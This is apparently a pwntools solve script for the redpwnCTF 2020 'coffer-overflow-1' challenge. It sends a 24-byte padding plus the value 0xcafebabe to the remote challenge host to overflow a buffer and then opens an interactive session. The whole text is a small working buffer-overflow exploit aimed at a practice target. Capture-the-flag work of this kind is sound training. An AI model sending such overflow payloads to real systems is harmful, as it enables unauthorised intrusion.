from pwn import *

#p = process('./coffer-overflow-1')
p = remote('2020.redpwnc.tf', 31255)

payload = b'A' * 24
payload += p32(0xcafebabe)

p.sendline(payload)
p.interactive()
